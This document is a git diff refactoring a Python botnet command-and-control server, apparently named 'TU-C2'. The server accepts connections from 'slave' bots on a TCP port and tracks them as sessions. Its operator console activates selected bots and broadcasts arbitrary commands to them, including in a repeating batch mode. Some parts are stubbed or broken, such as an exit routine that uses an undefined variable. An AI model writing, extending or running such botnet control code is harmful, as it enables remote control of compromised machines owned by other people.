@@ -9,14 +9,14 @@ import time
 
 q = queue.Queue()
 
-allConnections = []           # Stores all BotHandler instances
+allConnections = []         # Stores all BotHandler instances
 activeConnections = []      # Stores all currently active BotHandler sessions
 deadConnections = []        # Records the dead-instance's information
 clientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
 
 # -------------------------------------------------------------------------------------------
 
-class BotHandler(threading.Thread):
+class Handler(threading.Thread):
 
     def __init__(self, client, client_address, active, bot_id):
         threading.Thread.__init__(self)
@@ -39,18 +39,18 @@ class BotHandler(threading.Thread):
         # This specific line returns 'None'
         #self.BotName = threading.current_thread().getName()
 
-        print("[* BotHandler-Msg] Slave " + self.ip + ":" + str(self.port) + " connected with Session ID of " + str(self.bot_id))
+        print(f"[* Handler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
 
         # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
         clientAddressList[self.bot_id] = self.client_address
         # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
     
     def activate(self):
-        print("\n[*BotHandler-Msg] Activating Bot " + str(self.bot_id) + "...")
+        print(f"\n[*BotHandler-Msg] Activating Bot {str(self.bot_id)}...")
         self.isActive = True
     
     def deactivate(self):
-        print("\n[*BotHandler-Msg] Deactivating " + str(self.bot_id) + "...")
+        print(f"\n[*BotHandler-Msg] Deactivating {str(self.bot_id)}...")
         self.isActive = False
 
     def isActivated(self):
@@ -67,7 +67,7 @@ class BotHandler(threading.Thread):
 
     def execute(self, command):
 
-        print("\n[* BotHandler-Msg] Received Command: " + str(command) + " for bot " + str(self.bot_id))
+        print(f"[* BotHandler-Msg] Received Command: {str(command)} for bot {str(self.bot_id)}")
 
         try:
             #RecvBotCmd += "\n"
@@ -82,13 +82,17 @@ class BotHandler(threading.Thread):
             #     if t.is_alive() == False:
             #         print("\n[!] Died Thread: " + str(t))
             #         t.join()
-            print("Unable to send connection to bot " + (self.bot_id) + " at " + str(self.ip))
-            print(ex)
+            print(f"[* BotHandler-Msg] Unable to send connection to bot {self.bot_id} at {str(self.ip)}")
+            print(f"[* BotHandler-Msg] Error: {ex}")
+    
+    def download(self, remotepath, localfile):
+        print("TBC")
 
-
+    def upload(self, localfile, remotepath):
+        print("TBC")
 # -------------------------------------------------------------------------------------------
 
-class BotCmd(threading.Thread):
+class Interpreter(threading.Thread):
     def __init__(self, qv2):
         threading.Thread.__init__(self)     # Spawn a new thread for itself
         self.q = qv2                        # Queue used for issuing commands
@@ -97,91 +101,108 @@ class BotCmd(threading.Thread):
 
         while True:
 
-            cmd = str(input("BotCmd> "))
+            cmd = str(input("[TU-C2:CONSOLE]$ "))
 
             if (cmd == ""):
-                print("No command received. Try again...")
+                print("[* Interpreter-Msg] Error: No command received. Try again...")
                 pass
-
-            elif (cmd == "exit"):
-                print("[+] Sending Command: " + cmd + " to " + str(len(allConnections)) + " bots")
-                for conn in allConnections:                                         # for i in range(len(allConnections)):
-                    time.sleep(0.1)
-                    conn.execute(cmd)
-
-                print("Exiting connection[s] for all bots Please wait...")
-                time.sleep(5)
-                os._exit(0)
-
-            elif (cmd == "list-active"):
-                
-                print("---------------------------")
-                print("| List of Active Sessions |")
-                print("---------------------------")
-
-                for conn in activeConnections:
-                    print("| %3d | %20s |"% (conn.getID(), conn.getIP()))
-                    print("-------------------------")
-
-            elif (cmd == "list-all"):
-                print("---------------------------")
-                print("| List of All Connections |")
-                print("---------------------------")
-
-                for conn in allConnections:
-                    print("| %3d | %15s |"% (conn.getID(), conn.getIP()))
-                    print("-------------------------")
-
-            elif (cmd == "activate"):
-                
-                #try:
-                selectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
-                print("ID list obtained: " + str(selectedIDs))
-                #except:
-
-                for conn in allConnections:
-                    #print("Handler: ", str(conn))
-
-                    if conn.getID() in selectedIDs:
-                        print("Activating Bot " + str(conn.getID()))
-                        conn.activate()
-                        activeConnections.append(conn)
-
-                    #else:
-                    #    print("Bot %d not found in active list..."% (conn.getID()))
-
-            elif (cmd == "deactivate"):
-                deselectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
-                print("ID list obtained: " + str(deselectedIDs))
-
-                for conn in allConnections:
-                    #print("Handler: ", str(conn))
-
-                    if conn.getID() in deselectedIDs and conn.isActivated():
-                            print("Deactivating Bot " + str(conn.getID()))
-                            conn.deactivate()
-                            activeConnections.remove(conn)
-            elif (cmd == "batch-mode"):
-                batchMode()
-
+            elif (cmd.casefold() == "exit"):
+                self.exit()
+            elif (cmd.casefold() == "list-active"):
+                self.listActive()
+            elif (cmd.casefold() == "list-all"):
+                self.listAll()
+            elif (cmd.casefold() == "activate"):
+                self.activate()
+            elif (cmd.casefold() == "deactivate"):
+                self.deactivate()
+            elif (cmd.casefold() == "batch-mode"):
+                self.batchMode()
             else:
-                print("[+] Sending Command: " + cmd + " to " + str(len(allConnections)) + " bots")
-                for conn in activeConnections:                                         # for i in range(len(allConnections)):
-                    time.sleep(0.1)
-                    conn.execute(cmd)
-
+                print("TBC")
+                # print(f"[+] Sending Command: {cmd} to {str(len(allConnections))} + " bots")
+                # for conn in activeConnections:                                         # for i in range(len(allConnections)):
+                #     time.sleep(0.1)
+                #     conn.execute(cmd)
+#------------------------------------------------------------------------------------------------------------------------------
     def batchMode(self):
+        print("[* Interpreter-Msg] Entering Batch-Mode execution... Enter 'quit' at any point to exit batch-mode...")
+        batch_cmd = ""
 
-        os.system("clear")
-        batch_cmd = str(input("[Batch-CMD]# "))
-        print("[+] Sending Command: " + batch_cmd + " to " + str(len(allConnections)) + " bots")
-        for conn in activeConnections:                                         # for i in range(len(allConnections)):
+        while (batch_cmd.casefold() != "quit" and batch_cmd.casefold() != "q"):
+            batch_cmd = str(input("[Batch-CMD]# "))
+            print(f"[+] Sending Command: {batch_cmd} to {str(len(allConnections))} bots")
+            for conn in activeConnections:                                         
+                time.sleep(0.1)
+                conn.execute(batch_cmd)
+        
+        print(f"[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...")
+#------------------------------------------------------------------------------------------------------------------------------
+    def activate(self):
+        try:
+            selectedIDs = [int(n) for n in input('[+ Activation] Enter ID list to activate (seperated by spaces): ').split()]
+            print(f"[+ Activation] ID list obtained: {str(selectedIDs)}")
+
+        except Exception as ex:
+            print(f"[* Interpreter-Msg] Error with activation list: {ex}")
+            print(ex)
+
+        else:
+            for conn in allConnections:
+                #print("Handler: ", str(conn))
+
+                if conn.getID() in selectedIDs:
+                    print("Activating Bot " + str(conn.getID()))
+                    conn.activate()
+                    activeConnections.append(conn)
+#------------------------------------------------------------------------------------------------------------------------------
+    def deactivate(self):
+        try:
+            deselectedIDs = [int(n) for n in input('[- Deactivation] Enter IDs to deactivate (seperated by spaces): ').split()]
+            print(f"[- Deactivation] ID list obtained: {str(deselectedIDs)}")
+
+        except Exception as ex:
+            print(f"[* Interpreter-Msg] Error with deactivation list: {ex}")
+            
+        else:
+            for conn in allConnections:
+                if conn.getID() in deselectedIDs and conn.isActivated():
+                    print(f"[* Deactivation] Deactivating Bot {str(conn.getID())}")
+                    conn.deactivate()
+                    activeConnections.remove(conn)
+#------------------------------------------------------------------------------------------------------------------------------
+    def exit(self):
+        print(f"[* Interpreter-Msg] Sending Command: {cmd} to {str(len(allConnections))} bots")
+        for conn in allConnections:                                         # for i in range(len(allConnections)):
             time.sleep(0.1)
             conn.execute(cmd)
 
+        print("[* Interpreter-Msg] Exiting connection[s] for all bots Please wait...")
+        time.sleep(5)
+        os._exit(0)
+#------------------------------------------------------------------------------------------------------------------------------
+    def listActive(self):
+        print("---------------------------")
+        print("| List of Active Sessions |")
+        print("---------------------------")
 
+        for conn in activeConnections:
+            print("| %4d | %16s |"% (conn.getID(), conn.getIP()))
+            print("---------------------------")
+#------------------------------------------------------------------------------------------------------------------------------
+    def listAll(self):
+        print("---------------------------")
+        print("| List of All Connections |")
+        print("---------------------------")
 
-# --------------------------------------------------------------------------------------------------------------------------
+        for conn in allConnections:
+            print("| %4d | %16s |"% (conn.getID(), conn.getIP()))
+            print("---------------------------")
+#------------------------------------------------------------------------------------------------------------------------------
+    def clearScreen(self):
+        os.system("clear")
+    
+#=================================================================================================================================
 
 def listener(lhost, lport, q):
 
@@ -191,20 +212,20 @@ def listener(lhost, lport, q):
     server.bind(server_address)
     server.listen(100)
 
-    print("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
+    print(f"[* Listener] Starting Botnet listener on tcp://{lhost}:{str(lport)}\n")
 
-    BotCmdThread = BotCmd(q)        # Handles interface, queue is for commands
-    BotCmdThread.start()
+    InterpreterThread = Interpreter(q)        # Handles interface, queue is for commands
+    InterpreterThread.start()
 
     connRecord = 0
 
     while True:
 
         (client, client_address) = server.accept()  # start listening
-        print("Connection received from " + str(client_address[0]))
+        print(f"Connection received from {str(client_address[0])}")
 
         # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
-        newConn = BotHandler(client, client_address, False, connRecord)
+        newConn = Handler(client, client_address, False, connRecord)
         allConnections.append(newConn)
         connRecord += 1
         newConn.start()
@@ -214,14 +235,14 @@ def listener(lhost, lport, q):
 #import
 def main():
     if (len(sys.argv) < 3):
-        print("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[0] + " 0.0.0.0 8080\n")
+        print(f"[!] Usage:\n  [+] python3 {sys.argv[0]} <LHOST> <LPORT>\n  [+] Eg.: python3 {sys.argv[0]} 0.0.0.0 8080\n")
     else:
         try:
             lhost=sys.argv[1]
             lport=int(sys.argv[2])
             listener(lhost, lport, q)
         except Exception as ex:
-            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")
+            print(f"[-] Unable to establish the Handler. Error: {str(ex)}\n")
 
 if __name__ == '__main__':
     main()
